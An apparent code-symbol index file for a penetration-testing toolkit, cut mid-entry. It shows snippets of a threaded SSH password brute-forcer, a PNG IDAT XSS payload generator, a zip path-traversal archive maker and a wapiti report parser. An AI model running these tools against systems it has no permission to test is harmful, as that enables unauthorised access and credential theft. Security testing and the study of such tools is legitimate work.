/:::/~~\\:::\\    \\         /::::::|   |             /:::/\\:::\\    \\     \n           \\:::\\    \\        /:::/|::|   |               \\:::\\    \\        /:::/__\\:::\\    \\        /:::/    /      /:::/    \\:::\\    \\       /:::/|::|   |            /:::/__\\:::\\    \\    \n           /::::\\    \\      /:::/ |::|   |               /::::\\    \\      /::::\\   \\:::\\    \\      /:::/    /      /:::/    / \\:::\\    \\     /:::/ |::|   |           /::::\\   \\:::\\    \\   ",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "welcomeMessage",
        "kind": 2,
        "importPath": "libs.programs.Intel-One.intro",
        "description": "libs.programs.Intel-One.intro",
        "peekOfCode": "def welcomeMessage():\n    return random.choice([welcomeMessage_0, welcomeMessage_1, welcomeMessage_2, welcomeMessage_3, welcomeMessage_4])()",
        "detail": "libs.programs.Intel-One.intro",
        "documentation": {}
    },
    {
        "label": "clearConsole",
        "kind": 2,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "def clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'\n    os.system(command)\ndef ssh_connect(password):\n\tssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)\n\ttry:\n\t\tssh.connect(hostname, port=port, username=user, password=password)\n\t\t# print(f\"{green}Correct Password{reset_color} : {password}\")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "ssh_connect",
        "kind": 2,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "def ssh_connect(password):\n\tssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)\n\ttry:\n\t\tssh.connect(hostname, port=port, username=user, password=password)\n\t\t# print(f\"{green}Correct Password{reset_color} : {password}\")\n\t\tssh.exit()\n\t\tglobal pass_found, correct_password\n\t\tcorrect_password = password\n\t\tpass_found = True\n\t\tcorrect_pass_found()",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "correct_pass_found",
        "kind": 2,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "def correct_pass_found():\n\t# print(f\"{blue}[+]{reset_color} Password Found\")\n\t# print(f\"{blue}[+]{reset_color} {green}Server:{reset_color} ssh://{hostname}:{port}\")\n\t# print(f\"{blue}[+]{reset_color} {green}User:{reset_color} {user}\")\n\t# print(f\"{blue}[+]{reset_color} {green}Password:{reset_color} {correct_password}\")\n\tprint(f\"ssh {user}@{hostname}:{correct_password}\")\nif __name__==\"__main__\":\n\ttry:\n\t\twith open(pass_file) as f:\n\t\t\tpass_list = f.read().split(\"\\n\")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "blue",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "blue = colorama.Fore.BLUE\ngreen = colorama.Fore.GREEN\nred = colorama.Fore.RED\nreset_color = colorama.Style.RESET_ALL\nparser = argparse.ArgumentParser(description=\"Start a SSH bruteforce attack !\")\nparser.add_argument(\"--hostname\", \"-ip\", type=str, default=\"localhost\", help=\"Remote Ip of server. Default: localhost\")\nparser.add_argument(\"--port\", \"-p\", type=int, default=8022, help=\"Port on which ssh is running. Default: 22\")\nparser.add_argument(\"--user\", \"-u\", type=str, default=\"root\", help=\"User of ther remote machine. Default: root\")\nparser.add_argument(\"--passlist\", \"-pl\", type=str, default=\"passlist.txt\", help=\"Path to the password list file. Default: passlist.txt\")\nparser.add_argument(\"--delay\", \"-d\", type=float, default=0.5, help=\"Delay between attempts. Default: 0.5\")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "green = colorama.Fore.GREEN\nred = colorama.Fore.RED\nreset_color = colorama.Style.RESET_ALL\nparser = argparse.ArgumentParser(description=\"Start a SSH bruteforce attack !\")\nparser.add_argument(\"--hostname\", \"-ip\", type=str, default=\"localhost\", help=\"Remote Ip of server. Default: localhost\")\nparser.add_argument(\"--port\", \"-p\", type=int, default=8022, help=\"Port on which ssh is running. Default: 22\")\nparser.add_argument(\"--user\", \"-u\", type=str, default=\"root\", help=\"User of ther remote machine. Default: root\")\nparser.add_argument(\"--passlist\", \"-pl\", type=str, default=\"passlist.txt\", help=\"Path to the password list file. Default: passlist.txt\")\nparser.add_argument(\"--delay\", \"-d\", type=float, default=0.5, help=\"Delay between attempts. Default: 0.5\")\nparser.add_argument(\"--background\", action=\"store_true\", help=\"Only show successful attempts. Default: False\")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "red = colorama.Fore.RED\nreset_color = colorama.Style.RESET_ALL\nparser = argparse.ArgumentParser(description=\"Start a SSH bruteforce attack !\")\nparser.add_argument(\"--hostname\", \"-ip\", type=str, default=\"localhost\", help=\"Remote Ip of server. Default: localhost\")\nparser.add_argument(\"--port\", \"-p\", type=int, default=8022, help=\"Port on which ssh is running. Default: 22\")\nparser.add_argument(\"--user\", \"-u\", type=str, default=\"root\", help=\"User of ther remote machine. Default: root\")\nparser.add_argument(\"--passlist\", \"-pl\", type=str, default=\"passlist.txt\", help=\"Path to the password list file. Default: passlist.txt\")\nparser.add_argument(\"--delay\", \"-d\", type=float, default=0.5, help=\"Delay between attempts. Default: 0.5\")\nparser.add_argument(\"--background\", action=\"store_true\", help=\"Only show successful attempts. Default: False\")\nargs = parser.parse_args()",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "reset_color",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "reset_color = colorama.Style.RESET_ALL\nparser = argparse.ArgumentParser(description=\"Start a SSH bruteforce attack !\")\nparser.add_argument(\"--hostname\", \"-ip\", type=str, default=\"localhost\", help=\"Remote Ip of server. Default: localhost\")\nparser.add_argument(\"--port\", \"-p\", type=int, default=8022, help=\"Port on which ssh is running. Default: 22\")\nparser.add_argument(\"--user\", \"-u\", type=str, default=\"root\", help=\"User of ther remote machine. Default: root\")\nparser.add_argument(\"--passlist\", \"-pl\", type=str, default=\"passlist.txt\", help=\"Path to the password list file. Default: passlist.txt\")\nparser.add_argument(\"--delay\", \"-d\", type=float, default=0.5, help=\"Delay between attempts. Default: 0.5\")\nparser.add_argument(\"--background\", action=\"store_true\", help=\"Only show successful attempts. Default: False\")\nargs = parser.parse_args()\nhostname = args.hostname",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "parser = argparse.ArgumentParser(description=\"Start a SSH bruteforce attack !\")\nparser.add_argument(\"--hostname\", \"-ip\", type=str, default=\"localhost\", help=\"Remote Ip of server. Default: localhost\")\nparser.add_argument(\"--port\", \"-p\", type=int, default=8022, help=\"Port on which ssh is running. Default: 22\")\nparser.add_argument(\"--user\", \"-u\", type=str, default=\"root\", help=\"User of ther remote machine. Default: root\")\nparser.add_argument(\"--passlist\", \"-pl\", type=str, default=\"passlist.txt\", help=\"Path to the password list file. Default: passlist.txt\")\nparser.add_argument(\"--delay\", \"-d\", type=float, default=0.5, help=\"Delay between attempts. Default: 0.5\")\nparser.add_argument(\"--background\", action=\"store_true\", help=\"Only show successful attempts. Default: False\")\nargs = parser.parse_args()\nhostname = args.hostname\nport = args.port",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "args = parser.parse_args()\nhostname = args.hostname\nport = args.port\nuser = args.user\npass_file = args.passlist\ndelay = args.delay\nbackground = args.background\npass_found = False\nhost_down = False\ncorrect_password = None",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "hostname",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "hostname = args.hostname\nport = args.port\nuser = args.user\npass_file = args.passlist\ndelay = args.delay\nbackground = args.background\npass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "port",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "port = args.port\nuser = args.user\npass_file = args.passlist\ndelay = args.delay\nbackground = args.background\npass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "user",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "user = args.user\npass_file = args.passlist\ndelay = args.delay\nbackground = args.background\npass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "pass_file",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "pass_file = args.passlist\ndelay = args.delay\nbackground = args.background\npass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "delay",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "delay = args.delay\nbackground = args.background\npass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'\n    os.system(command)",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "background",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "background = args.background\npass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'\n    os.system(command)\ndef ssh_connect(password):",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "pass_found",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "pass_found = False\nhost_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'\n    os.system(command)\ndef ssh_connect(password):\n\tssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "host_down",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "host_down = False\ncorrect_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'\n    os.system(command)\ndef ssh_connect(password):\n\tssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)\n\ttry:",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "correct_password",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "correct_password = None\ndef clearConsole():\n    command = 'clear'\n    if os.name in ('nt', 'dos'):\n        command = 'cls'\n    os.system(command)\ndef ssh_connect(password):\n\tssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)\n\ttry:\n\t\tssh.connect(hostname, port=port, username=user, password=password)",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\tssh",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\tssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)\n\ttry:\n\t\tssh.connect(hostname, port=port, username=user, password=password)\n\t\t# print(f\"{green}Correct Password{reset_color} : {password}\")\n\t\tssh.exit()\n\t\tglobal pass_found, correct_password\n\t\tcorrect_password = password\n\t\tpass_found = True\n\t\tcorrect_pass_found()\n\t\tquit()",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\t\tcorrect_password",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\t\tcorrect_password = password\n\t\tpass_found = True\n\t\tcorrect_pass_found()\n\t\tquit()\n\texcept Exception as err:\n\t\tglobal host_down\n\t\tif err.args[0] == 111:\n\t\t\tprint(f\"{red}Connection Refused, Host seems down. Stopping Attack\")\n\t\t\thost_down = True\n\t\t\tquit()",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\t\tpass_found",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\t\tpass_found = True\n\t\tcorrect_pass_found()\n\t\tquit()\n\texcept Exception as err:\n\t\tglobal host_down\n\t\tif err.args[0] == 111:\n\t\t\tprint(f\"{red}Connection Refused, Host seems down. Stopping Attack\")\n\t\t\thost_down = True\n\t\t\tquit()\n\t\telif err.args[0] == 7:",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\t\t\thost_down",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\t\t\thost_down = True\n\t\t\tquit()\n\t\telif err.args[0] == 7:\n\t\t\tprint(f\"{red}Connection Refused, Host seems down. Stopping Attack\")\n\t\t\thost_down = True\n\t\t\tquit()\n\t\telse:\n\t\t\tif not background:\n\t\t\t\tif not pass_found:\n\t\t\t\t\tprint(f\"{red}Wrong Password - {password} \")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\t\t\thost_down",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\t\t\thost_down = True\n\t\t\tquit()\n\t\telse:\n\t\t\tif not background:\n\t\t\t\tif not pass_found:\n\t\t\t\t\tprint(f\"{red}Wrong Password - {password} \")\ndef correct_pass_found():\n\t# print(f\"{blue}[+]{reset_color} Password Found\")\n\t# print(f\"{blue}[+]{reset_color} {green}Server:{reset_color} ssh://{hostname}:{port}\")\n\t# print(f\"{blue}[+]{reset_color} {green}User:{reset_color} {user}\")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\t\t\tpass_list",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\t\t\tpass_list = f.read().split(\"\\n\")\n\t\t\t# print(f\"{blue}[+]{reset_color} {green}Starting bruteforce attact on ssh://{hostname}:{port} for user: {user}\\n\")\n\t\t\tfor password in pass_list:\n\t\t\t\tif not pass_found and not host_down:\n\t\t\t\t\tt = Thread(target=ssh_connect, args=(password,))\n\t\t\t\t\tt.start()\n\t\t\t\t\ttime.sleep(delay)\n\t\t\t\telse:\n\t\t\t\t\tif pass_found:\n\t\t\t\t\t\tbreak",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tt",
        "kind": 5,
        "importPath": "libs.programs.SSHBrute.ssh-brute",
        "description": "libs.programs.SSHBrute.ssh-brute",
        "peekOfCode": "\t\t\t\t\tt = Thread(target=ssh_connect, args=(password,))\n\t\t\t\t\tt.start()\n\t\t\t\t\ttime.sleep(delay)\n\t\t\t\telse:\n\t\t\t\t\tif pass_found:\n\t\t\t\t\t\tbreak\n\t\t\t\t\telse:\n\t\t\t\t\t\tbreak\n\texcept FileNotFoundError:\n\t\tprint(f\"{red}Password List file not found.\")",
        "detail": "libs.programs.SSHBrute.ssh-brute",
        "documentation": {}
    },
    {
        "label": "replace_multiple_spaces",
        "kind": 2,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "def replace_multiple_spaces(string):\n\tpattern = re.compile(r\"\\s+\")\n\tnew_string = pattern.sub(\" \", string)\n\treturn new_string\ndef lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")\ninput_string = open(parameter, \"r\").read()\n#input_string = parameter\n#print(input_string)\nmy_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "lazy_grep",
        "kind": 2,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "def lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")\ninput_string = open(parameter, \"r\").read()\n#input_string = parameter\n#print(input_string)\nmy_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]\nfor my_string in lazy_grep(input_string):\n\tif all(x not in my_string for x in my_list):\n\t\tf =open(\"tables\", \"a\")\n\t\tf.write(mystring.trim())",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "parser = argparse.ArgumentParser()\nparser.add_argument('parameter', type=str, help='an integer parameter')\nargs = parser.parse_args()\nparameter = args.parameter\ndef replace_multiple_spaces(string):\n\tpattern = re.compile(r\"\\s+\")\n\tnew_string = pattern.sub(\" \", string)\n\treturn new_string\ndef lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "args = parser.parse_args()\nparameter = args.parameter\ndef replace_multiple_spaces(string):\n\tpattern = re.compile(r\"\\s+\")\n\tnew_string = pattern.sub(\" \", string)\n\treturn new_string\ndef lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")\ninput_string = open(parameter, \"r\").read()\n#input_string = parameter",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "parameter",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "parameter = args.parameter\ndef replace_multiple_spaces(string):\n\tpattern = re.compile(r\"\\s+\")\n\tnew_string = pattern.sub(\" \", string)\n\treturn new_string\ndef lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")\ninput_string = open(parameter, \"r\").read()\n#input_string = parameter\n#print(input_string)",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "\tpattern",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "\tpattern = re.compile(r\"\\s+\")\n\tnew_string = pattern.sub(\" \", string)\n\treturn new_string\ndef lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")\ninput_string = open(parameter, \"r\").read()\n#input_string = parameter\n#print(input_string)\nmy_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]\nfor my_string in lazy_grep(input_string):",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "\tnew_string",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "\tnew_string = pattern.sub(\" \", string)\n\treturn new_string\ndef lazy_grep(string):\n\treturn replace_multiple_spaces(string).split(\"</tr>\")\ninput_string = open(parameter, \"r\").read()\n#input_string = parameter\n#print(input_string)\nmy_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]\nfor my_string in lazy_grep(input_string):\n\tif all(x not in my_string for x in my_list):",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "input_string",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "input_string = open(parameter, \"r\").read()\n#input_string = parameter\n#print(input_string)\nmy_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]\nfor my_string in lazy_grep(input_string):\n\tif all(x not in my_string for x in my_list):\n\t\tf =open(\"tables\", \"a\")\n\t\tf.write(mystring.trim())\n\t\tf.close()",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "#input_string",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "#input_string = parameter\n#print(input_string)\nmy_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]\nfor my_string in lazy_grep(input_string):\n\tif all(x not in my_string for x in my_list):\n\t\tf =open(\"tables\", \"a\")\n\t\tf.write(mystring.trim())\n\t\tf.close()",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "my_list",
        "kind": 5,
        "importPath": "libs.programs.wapiti.wapiti",
        "description": "libs.programs.wapiti.wapiti",
        "peekOfCode": "my_list = [\">0</td>\", \"Content Security Policy Configuration\", \"</tbody>\"]\nfor my_string in lazy_grep(input_string):\n\tif all(x not in my_string for x in my_list):\n\t\tf =open(\"tables\", \"a\")\n\t\tf.write(mystring.trim())\n\t\tf.close()",
        "detail": "libs.programs.wapiti.wapiti",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def banner():\n    print(\n        \"\"\"               ____                    \n __  _____ ___|___ \\ _ __  _ __   __ _ \n \\ \\/ / __/ __| __) | '_ \\| '_ \\ / _` |\n  >  <\\__ \\__ \\/ __/| |_) | | | | (_| |\n /_/\\_\\___/___/_____| .__/|_| |_|\\__, |\n                    |_|          |___/\n PNG IDAT chunks XSS payload generator\\n\"\"\"\n    )",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "parse_args",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def parse_args():\n    parser = argparse.ArgumentParser(\n        description=\"PNG IDAT chunks XSS payload generator\", epilog=\"Don't be evil :)\"\n    )\n    parser.add_argument(\"-p\", dest=\"payload\", help=\"XSS Payload\", required=True)\n    parser.add_argument(\"-o\", dest=\"output\", help=\"Output .png file\", required=True)\n    return parser.parse_args()\ndef reverse_huffman(huffman):\n    bitstream = \"\"\n    for char in list(huffman):",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "reverse_huffman",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def reverse_huffman(huffman):\n    bitstream = \"\"\n    for char in list(huffman):\n        bits = f\"{ord(char):08b}\"\n        bitstream = bits + bitstream\n    bitstream = bitstream[::-1]  # strrev($bitstream);\n    bitstream = bitstream[3:]  # substr($bitstream, 3);\n    chars = []\n    i = 0\n    while len(bitstream) > 0:",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "gzdeflate",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def gzdeflate(string):\n    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)\n    compressed = compressor.compress(string)\n    compressed += compressor.flush()\n    return compressed\ndef to_ord_array(bin_string):\n    return [ord(char) for char in bin_string]\ndef reverse_filter_1(bin_string):\n    p = to_ord_array(bin_string)\n    s = len(p)",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "to_ord_array",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def to_ord_array(bin_string):\n    return [ord(char) for char in bin_string]\ndef reverse_filter_1(bin_string):\n    p = to_ord_array(bin_string)\n    s = len(p)\n    payload = []\n    i = 0\n    while i < (len(p) - 3):\n        p[i + 3] = (p[i + 3] + p[i]) % 256\n        i += 1",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "reverse_filter_1",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def reverse_filter_1(bin_string):\n    p = to_ord_array(bin_string)\n    s = len(p)\n    payload = []\n    i = 0\n    while i < (len(p) - 3):\n        p[i + 3] = (p[i + 3] + p[i]) % 256\n        i += 1\n    for filter1 in p:\n        payload.append(filter1)",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "reverse_filter_3",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def reverse_filter_3(bin_string):\n    p = to_ord_array(bin_string)\n    s = len(p)\n    payload = []\n    i = 0\n    while i < (len(p) - 3):\n        p[i + 3] = (p[i + 3] + int(p[i] / 2)) % 256\n        i += 1\n    for filter3 in p:\n        payload.append(filter3)",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "bypass_png_filters",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def bypass_png_filters(inflate):\n    one = reverse_filter_1(inflate)\n    three = reverse_filter_3(inflate)\n    mergedlist = one + three\n    return mergedlist\ndef generate_final_payload(payload, png_output):\n    print(\"[i] Generating final PNG output\")\n    # Thanks to admanLogue and hLk_886 for this PNG Code\n    im = Image.new(\"RGB\", (32, 32))\n    i = 0",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "generate_final_payload",
        "kind": 2,
        "importPath": "libs.programs.xss2png.xss2png",
        "description": "libs.programs.xss2png.xss2png",
        "peekOfCode": "def generate_final_payload(payload, png_output):\n    print(\"[i] Generating final PNG output\")\n    # Thanks to admanLogue and hLk_886 for this PNG Code\n    im = Image.new(\"RGB\", (32, 32))\n    i = 0\n    c = 0\n    while i < len(payload):\n        try:\n            r = payload[i]\n            g = payload[i + 1]",
        "detail": "libs.programs.xss2png.xss2png",
        "documentation": {}
    },
    {
        "label": "filein",
        "kind": 5,
        "importPath": "libs.wordlists.SecLists.Payloads.Zip-Traversal.make",
        "description": "libs.wordlists.SecLists.Payloads.Zip-Traversal.make",
        "peekOfCode": "filein = \"index.php\"\nprint(\"[i] FileIn: %s\\n\" % filein)\n# How deep are we going?\ndepth = \"\"\n# Loop 11 times (00-10)\nfor i in range(11):\n  # The .zip file to use\n  zipname = \"depth-%02d.zip\" % i\n  print(\"[i] ZipName: %s\" % zipname)\n  # Get the zip file out ready",
        "detail": "libs.wordlists.SecLists.Payloads.Zip-Traversal.make",
        "documentation": {}
    },
    {
        "label": "depth",
        "kind": 5,
        "importPath": "libs.wordlists.SecLists.Payloads.Zip-Traversal.make",
        "description": "libs.wordlists.SecLists.Payloads.Zip-Traversal.make",
        "peekOfCode": "depth = \"\"\n# Loop 11 times (00-10)\nfor i in range(11):\n  # The .zip file to use\n  zipname = \"depth-%02d.zip\" % i\n  print(\"[i] ZipName: %s\" % zipname)\n  # Get the zip file out ready\n  with zipfile.ZipFile(zipname , 'w') as zip:\n  \t# The file INSIDDE the zip\n    filezip = \"%s%s\" % (depth, filein)",
        "detail": "libs.wordlists.SecLists.Payloads.Zip-Traversal.make",
        "documentation": {}
    },
    {
        "label": "gethttporhtp",
        "kind": 2,
        "importPath": "helperfuncts",
        "description": "helperfuncts",
        "peekOfCode": "def gethttporhtp(ip):\n    testingurl = filterip(ip)\n    http = httpx.get(f\"http://{testingurl}\", follow_redirects=True, verify=False)\n    return http.url\ndef filterip(ip):\n    return re.sub(\"\\*\\.\", '', re.sub(\"https?//\", '', re.sub(\"www.\", '', ip)))",
        "detail": "helperfuncts",
        "documentation": {}
    },
    {
